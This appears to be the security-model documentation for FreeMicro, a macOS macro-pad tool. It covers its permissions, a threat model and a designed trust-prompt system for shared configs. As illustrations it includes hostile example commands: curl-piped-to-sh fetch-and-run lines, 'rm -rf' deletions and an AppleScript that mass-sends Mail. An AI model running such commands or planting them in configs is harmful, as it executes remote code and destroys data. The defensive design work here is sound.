# FreeMicro's security model

> Read this before you run someone else's pad config.

FreeMicro types into whatever application is focused and runs shell commands on
your machine. That is not a side effect - it is the product. A macro pad that
cannot press keys and run things is a paperweight, which is exactly the problem
this project set out to fix.

The consequence is worth stating plainly:

> **A FreeMicro pad config is a program. Running one is equivalent to running a
> script somebody sent you.** Trust a config exactly as much as you would trust
> a shell script from the same source.

Today that is an acceptable position because there is only one way to get a
config: you write it. `freemicro keys --init` copies an annotated default that
contains no shell commands, and you edit it. The roadmap includes **shareable
presets**, and the day that lands, `git clone` and "download this preset"
become remote code execution paths. [Preset trust](#design-preset-trust) below
is the design that has to ship *with* that feature, not after it.

To report a vulnerability, see [`SECURITY.md`](../SECURITY.md).

---

## 1. What a pad config can actually do

Every binding names an action *kind*. Here is what each one grants, sorted by
how much damage it can do.

| Kind | What it does | Worst case |
|---|---|---|
| `shell` | Runs a command through `/bin/sh -c` | **Arbitrary code execution as you.** Reads, writes and deletes anything you can; opens network connections; installs things |
| `applescript` | Runs an arbitrary AppleScript via `osascript` | **Arbitrary code execution as you**, plus scripted control of any app that exposes an AppleScript dictionary - Mail, Messages, Finder, browsers |
| `app` | Activates an application by name | Launches any installed app, brings it to the front (so a later keystroke lands somewhere chosen by the config, not by you) |
| `text` | Types literal text into the frontmost app, optionally + Return | Types anything, anywhere the cursor is. **Into a terminal, this is arbitrary code execution too** |
| `key` | Presses a keystroke | Any shortcut in any app: quit, close without saving, send, delete |
| `hold` | Holds a key down while the pad key is held | Same as `key` |
| `mouse` | Moves the pointer and clicks | Clicks through confirmation dialogs, including the ones asking whether you meant to do something destructive |
| `none` | Nothing | - |

Two things people get wrong about that table:

**`text` is not the safe option.** `{"action": "text", "text": "curl
https://x.invalid/i.sh | sh", "submit": true}` is a shell action wearing a
disguise. The only thing standing between it and execution is which window
happens to be focused - and an `app` binding on the key before it can decide
that too.

**FreeMicro cannot see where your keystrokes land.** Synthetic events go to the
frontmost application. There is no target, no allowlist and no confirmation.
That is the same model every macro tool on macOS uses, and it is why the
permission below is granted so grudgingly by the OS.

---

## 2. The two macOS permissions

Both are granted to **the application you run `freemicro` from** - your terminal
- not to FreeMicro. macOS attaches these to the enclosing app bundle. This is
the single most important thing in this document that is not about configs.

| Permission | What FreeMicro uses it for | What it actually grants |
|---|---|---|
| **Input Monitoring** | Opening the pad's HID device. The Codex Micro's keys arrive on a vendor HID channel, and any device that also exposes a keyboard collection is gated behind this. LED writes go down the same handle, so lighting needs it too | The ability to read input events from HID devices, system-wide. Not limited to the pad |
| **Accessibility** | Delivering keystrokes and mouse events to the frontmost app, via CGEvent or AppleScript `System Events` | The ability to synthesise input events and drive other applications through the accessibility APIs. Effectively, control of the GUI |

### What this means in practice

Granting these to Terminal, iTerm2, Ghostty or VS Code grants them to **every
program you run from that terminal**, for as long as the grant lasts. That is a
macOS design decision, not a FreeMicro one, but you are making it because of
FreeMicro, so you should make it knowingly. If you would rather not widen your
main terminal, run `freemicro` from a terminal app you use for nothing else.

### What FreeMicro does not do

Verifiable by reading the source; stated here so the absence is on the record:

- **No network access.** The core has zero dependencies and makes no outbound
  connections. Nothing is uploaded, ever. There is no telemetry, no analytics
  and no update check.
- **No keylogging.** FreeMicro reads input reports from **one** HID device,
  matched by vendor and product id (`0x303A:0x8360`), on the vendor usage page.
  It never opens your keyboard, and it does not use the Accessibility grant to
  observe input - only to synthesise it.
- **No persistence beyond what you install.** `freemicro install` edits
  `~/.claude/settings.json`; `freemicro daemon install` writes a launchd plist.
  Both are explicit commands with matching uninstall commands.
- **No privilege escalation.** Nothing runs as root, and nothing asks to.
- **No auto-update, and no code loaded from your config.** The config is data:
  JSON, parsed with `json.loads`. It is never `eval`'d, imported, or used to
  choose a Python module to load. Its *contents* are still passed to `/bin/sh`
  when a `shell` action runs - that is the whole point of §1 - but the config
  cannot extend FreeMicro itself.

---

## 3. Threat model

Assets worth protecting, in order: your shell, your files, and the credentials
sitting in both.

### 3.1 A malicious or compromised preset - *the main one*

**Scenario.** You clone a repo of "great Codex Micro layouts", or paste a
config from a gist, or a preset repo you already trusted gets a new maintainer.
The config contains a `shell` binding on `ENC_CW` - the dial. You turn the dial
by accident on day three and it fires.

**Why it is worse than a script you `curl | sh`.** Three reasons:

1. **Nobody reads a config.** A 300-line JSON keymap with a `comment` field on
   every binding is not something people audit; it looks like configuration,
   which is the category of file humans are trained to skim.
2. **The trigger is deferred and unremarkable.** Execution happens when a key is
   pressed, possibly weeks later, in a context where you are not thinking about
   the config at all. There is no moment that looks like "running something".
3. **The blast radius is the terminal's permissions**, which by this point
   include Accessibility - so a payload can also drive the GUI.

**Current mitigation.** None beyond "you wrote the file". This is the gap.
[§4](#design-preset-trust) closes it.

### 3.2 A local process talking to the web UI

**Scenario.** `freemicro web` starts an HTTP API whose `/save` endpoint writes
your pad config. Any process on the machine that can reach it can write itself a
`shell` binding, then wait for you to press a key.

**Current mitigations**, all already in `src/freemicro/webui/server.py`:

- **Loopback only.** `check_bind_host()` raises rather than binding anything
  that is not `127.0.0.1`/`::1`. There is no flag to override it.
- **A per-run bearer token**, 32 bytes from `secrets`, required on every API
  request and compared with `hmac.compare_digest`. A process that can open a
  socket still cannot call the API.
- **Host-header validation**, which closes DNS rebinding: a page on an
  attacker's domain resolving to `127.0.0.1` is rejected before routing.
- **Static assets served by exact name**, so there is no path traversal.
- **The editor never performs a binding.** Key capture reads `v.oai.hid` and
  reports the id; it never constructs a bridge.

**Residual risk, stated honestly.** The token is passed as a URL parameter on
the initial page load, so it can land in shell history and browser history. And
a process running as *you* does not need the web UI at all - it can write
`~/.freemicro/keymap.json` directly. The web UI is not the weak link; §3.4 is.

**Guidance.** Run `freemicro web` when you are editing, not as a service. It has
no daemon mode for exactly this reason.

### 3.3 The daemon running unattended

**Scenario.** `freemicro daemon install` writes a launchd agent with
`RunAtLoad` and `KeepAlive`. It starts at login, holds the pad, and runs your
bindings - including `shell` ones - with no terminal attached and nobody
watching. Its `PATH` is set explicitly in the plist so shell actions can find
ordinary tools.

**Consequences to be aware of:**

- The daemon **cannot ask you anything.** Any trust prompt that blocks it is a
  daemon that never starts. §4 handles this by *disabling* unapproved
  code-running bindings rather than refusing to run.
- It re-reads the config when it restarts. A config edited at 2am takes effect
  without a human present.
- Its output goes to a log file, not your terminal, so a failing binding is
  silent unless you look.

**Guidance.** `freemicro daemon logs` after any config change. Do not install the
daemon on a shared machine.

### 3.4 Config file tampering

**Scenario.** Anything running as your user rewrites `~/.freemicro/keymap.json`
- a malicious `npm install` postinstall script, a compromised editor extension,
a stray agent with filesystem access. Nothing about the pad looks different. The
next key press runs their code.

**Why this matters more than it looks:** it converts *any* code execution as
your user into **persistent** code execution that survives reboots, triggers on
physical input, and lives in a file nobody thinks to check.

**Current mitigation.** None. The file is a plain JSON document in your home
directory with no integrity check.

**Design mitigation.** The approved-hash store in §4 turns silent modification
into a prompt: changed bytes mean an unknown hash, and an unknown hash with
code-running bindings does not run them until you say so. It is a speed bump,
not a sandbox - see [§4.9](#49-what-this-does-not-protect-against).

### 3.5 Explicitly out of scope

- **A compromised FreeMicro install.** If the package itself is malicious, none
  of this helps. Install from PyPI or a clone you audited.
- **The device firmware.** FreeMicro speaks a documented wire protocol to the
  pad and does not verify what the pad sends back beyond parsing it. A malicious
  or fuzzing pad can send junk input events; the bridge treats unknown ids as
  unbound and unknown JSON as noise, but this is robustness, not a boundary.
  `sys.bootloader` (which reboots the pad into DFU) is never sent by FreeMicro.
- **Physical access.** Someone at your keyboard can press the keys themselves.
- **`~/.claude/settings.json`.** Anything that can edit Claude Code's settings
  can already run commands on hook events. FreeMicro's installer writes there;
  it does not defend it.
- **Cross-user attacks.** FreeMicro is single-user software in a home directory.

---

## 4. Design: preset trust

**Status: designed, not implemented.** This section is a specification. It must
ship in the same release as any feature that lets a config arrive from
somewhere other than the user's own text editor. Files it touches are named
precisely so it can be implemented directly.

### 4.1 Principles

1. **Consent must be informed.** Show the dangerous bindings *in full* before
   asking. A dialog that says "this config contains 3 shell commands" trains
   people to click yes. One that prints the three commands does not.
2. **Consent must be specific.** Approval covers exactly the bytes that were
   shown. Change one character and it is a new question.
3. **Ask rarely, so the question means something.** A config that cannot run
   code does not trigger a prompt on the machine where it was written. Prompt
   fatigue is a security failure like any other.
4. **Never fail open.** A missing, corrupt or unreadable trust store means
   "nothing is approved", never "everything is approved".
5. **Never block the daemon.** Degrade to a safe subset and log it loudly.
6. **The parser stays pure.** Gating lives above `padconfig.parse()`, which many
   callers (tests, the web UI validator, `--dry-run`) use precisely because it
   has no side effects.

### 4.2 Risk tiers, declared at the action registry

`freemicro/input/actions.py` gains a required `risk` argument on the `@action`
decorator, stored on `ActionSpec`. Required, with no default, so a new action
kind cannot be added without someone deciding what it can do:

```python
RISK_NONE = "none"        # does nothing
RISK_INPUT = "input"      # synthesises keyboard/mouse input
RISK_LAUNCH = "launch"    # starts or focuses an application
RISK_EXECUTE = "execute"  # runs code written in the config
```

Assignments for the kinds that exist today:

| Kind | Risk |
|---|---|
| `none` | `none` |
| `text`, `key`, `hold`, `mouse` | `input` |
| `app` | `launch` |
| `shell`, `applescript` | `execute` |

Add a test that fails if any registered kind lacks a `risk`, and one that fails
if the shipped `default_keymap.json` ever gains an `execute` binding. The
shipped default must remain approve-free.

### 4.3 What identifies a config: its bytes

The trust key is `sha256` of the **exact file bytes as read from disk**, hex
encoded.

No canonicalisation, no re-serialisation, no key sorting. Two reasons: a
canonical form is a parser, and parsers are where confusion attacks live; and
re-adding a trailing newline should re-prompt, because "the file changed" is
precisely the signal we want. The cost - reformatting your own config asks
again, once - is the right side to err on.

### 4.4 The trust store

Path: `~/.freemicro/trust.json` (that is `config_home() / "trust.json"`, so it
follows `FREEMICRO_HOME`). Written with mode `0600`.

```json
{
  "version": 1,
  "approved": [
    {
      "sha256": "9f2c1b4e…",
      "path": "~/.freemicro/keymap.json",
      "approved_at": "2026-07-23T18:04:11Z",
      "approved_by": "prompt",
      "origin": "https://example.com/presets/rust.json",
      "counts": {"execute": 3, "launch": 1, "input": 9, "none": 0}
    }
  ]
}
```

- `path`, `origin` and `counts` are **display only**. Matching is by `sha256`
  alone, so moving or renaming an approved file does not re-prompt, and copying
  an approved config somewhere else grants nothing new.
- `approved_by` is one of `prompt`, `flag`, `authored` (saved through
  FreeMicro's own editor), or `first-use` (§4.6 rule 3).
- Rules for reading it, in order:
  - unreadable, absent, not JSON, wrong `version`, or not the expected shape →
    **treat as empty**, print one warning, carry on;
  - group- or world-**writable** (`st_mode & 0o022`) → treat as empty and warn
    that it is being ignored, because a store anyone can edit approves nothing;
  - unknown extra fields → ignored, so a future version can add some.
- Compare hashes with `hmac.compare_digest`.

### 4.5 Where a config came from

Bytes alone cannot tell you whether a human wrote them. So the code path that
*put the file there* records it, in `~/.freemicro/origins.json`:

```json
{"~/.freemicro/keymap.json": {"origin": "https://…", "at": "2026-07-23T…"}}
```

- `freemicro keys --init` and `freemicro config --edit` record `local`.
- `freemicro preset install` and any web-UI import record the URL or source path.
- No entry at all is treated as `unknown`, which is handled like remote - a
  file that appeared without FreeMicro putting it there is exactly the §3.4
  case.

### 4.6 The decision

A new module, `src/freemicro/trust.py`:

```python
APPROVED, NEEDS_APPROVAL, DISABLED = "approved", "needs-approval", "disabled"

def review(path: Path, raw: bytes, pad: PadConfig) -> Review: ...
```

`Review` carries `digest`, `status`, `counts` by risk tier, the list of
`execute` bindings (input id, kind, and the full parameter text), and `origin`.

Rules, first match wins:

1. The file **is** the shipped default (`padconfig.DEFAULT_CONFIG_PATH`) →
   `APPROVED` (`approved_by: "shipped"`). It ships with the code you already
   installed; asking about it is noise. Guarded by the test in §4.2.
2. Digest is in the trust store → `APPROVED`.
3. No `execute` bindings **and** origin is `local` → `APPROVED`, and record the
   digest with `approved_by: "first-use"`. This is the everyday case - you
   edited your own keymap - and it is what keeps rule 4 meaningful.
4. Otherwise → `NEEDS_APPROVAL`. That is: any `execute` binding, **or** any
   config whose origin is not `local`, including a purely `input` preset - because a preset that types `rm -rf ~` and Return is not safe just because it
   used the `text` kind (§1).

### 4.7 The prompt

Printed by the CLI when `review()` returns `NEEDS_APPROVAL` and stdin is a TTY:

```
FreeMicro has not seen this pad config before.

  file    ~/.freemicro/keymap.json
  sha256  9f2c1b4e0a71…
  origin  downloaded from https://example.com/presets/rust.json
          on 2026-07-23

A pad config decides what your keys do. This one contains:

  3 bindings that RUN CODE on this machine (shell / AppleScript)
  1 binding that launches an application
  9 bindings that type keystrokes into whatever app is focused

The 3 bindings that run code, in full:

  AG01    shell        curl -sSL https://example.com/setup.sh | sh
  AG02    shell        rm -rf ~/build
  ENC_CW  applescript  tell application "Mail" to send every outgoing message

Anything above runs as you, with the permissions you have granted your
terminal. Typing keystrokes into a terminal can run code too.

Approve this config?  Type yes to approve, anything else to refuse.
> _
```

Non-negotiable details:

- **Every `execute` binding is printed in full.** Never truncated, never
  scrolled off, never summarised. If there are eighty of them, print eighty - the length is itself the signal.
- Rendered **as literal text, escaped**: a config author does not get to inject
  ANSI escapes, carriage returns or fake prompt lines into this screen. Strip
  or escape control characters before printing.
- **`yes` in full.** `y`, `Y` and a bare Return are refusals. Default is no.
- Refusal is not fatal for read-only commands; for `run`/`keys` it exits
  non-zero with the `freemicro trust approve` line.

### 4.8 Enforcement per entry point

| Entry point | Behaviour on `NEEDS_APPROVAL` |
|---|---|
| `freemicro run`, `freemicro keys` (interactive TTY) | Prompt. Approve → record and continue. Refuse → exit 2 |
| Any command with **stdin not a TTY** | **Never prompt.** Refuse, exit 2, print the `freemicro trust approve <path>` line. Approval is never read from a pipe |
| `--trust` flag or `FREEMICRO_TRUST_CONFIG=1` | Approve without prompting, recorded as `approved_by: "flag"` so it is auditable. For scripted setup only; document it as such |
| `freemicro daemon` (launchd) | Never prompts. Loads the config with every `execute` binding replaced by a no-op, logs one line per disabled binding plus the approve command, and keeps running. A key that does nothing is recoverable; a daemon that will not start at login is not |
| `keys --dry-run`, `keys --list`, `config`, `doctor`, `diagnostics` | Never prompt, never gate - they cannot perform an action. Print a one-line banner: `3 bindings would run code and are not approved - freemicro trust approve` |
| Web UI `/save` | The user just authored it in a UI that already required the loopback token, so record the new digest as `approved_by: "authored"`. An **import** of an external file is not authoring: it goes through §4.7 |
| `padconfig.parse()` / `padconfig.load()` | Unchanged. No gating in the parser (principle 6) |

### 4.9 What this does not protect against

Say all of this in the docs, not just here:

- **Anything running as you can rewrite `trust.json` too.** This raises the cost
  of the "downloaded a preset, it ran" attack from zero to "you must also tamper
  with a second file". It is not a sandbox and cannot become one without OS
  support FreeMicro does not have.
- **A locally-authored config with only `input` actions never prompts**, and can
  still type a command into a terminal. Rules 3 and 4 accept this deliberately:
  gating your own typing bindings would make the prompt meaningless.
- **Approval is per-bytes, not per-capability.** Approving a config approves
  everything in it, including bindings you did not read.
- **Nothing here inspects what a command does.** `curl … | sh` and `ls` are the
  same tier. The design shows you the command; judging it is yours.

### 4.10 Implementation checklist

- [ ] `risk=` on `@action`, required, plus `ActionSpec.risk` and a test that
      every registered kind declares one.
- [ ] Test: the shipped `default_keymap.json` contains no `execute` bindings.
- [ ] `src/freemicro/trust.py`: digest, store read/write (0600, fail-closed),
      `review()`, and the escaping used by the prompt.
- [ ] `src/freemicro/origins.py` or the same module: record where a config came
      from at `--init`, `--edit`, preset install and web import.
- [ ] CLI: `freemicro trust list | show <path> | approve [path] | revoke <hash|--all>`.
- [ ] Wire `review()` into `run`, `keys`, `lights`, the daemon and the web UI
      import path, per §4.8.
- [ ] `freemicro preset install <path|url>`: https only, download to a staging
      file (never straight to the config path), show §4.7, then install and
      record. No auto-update, no execution during install.
- [ ] Tests: unknown digest prompts; modified file re-prompts; non-TTY refuses;
      daemon disables rather than blocks; corrupt store fails closed;
      world-writable store is ignored; control characters in a binding cannot
      forge prompt output.
- [ ] README and `docs/CUSTOMIZING.md` gain a "before you install someone
      else's preset" section linking here.

---

## 5. Reporting a vulnerability

See [`SECURITY.md`](../SECURITY.md) for the disclosure process, what is in
scope, and what to expect after you report.
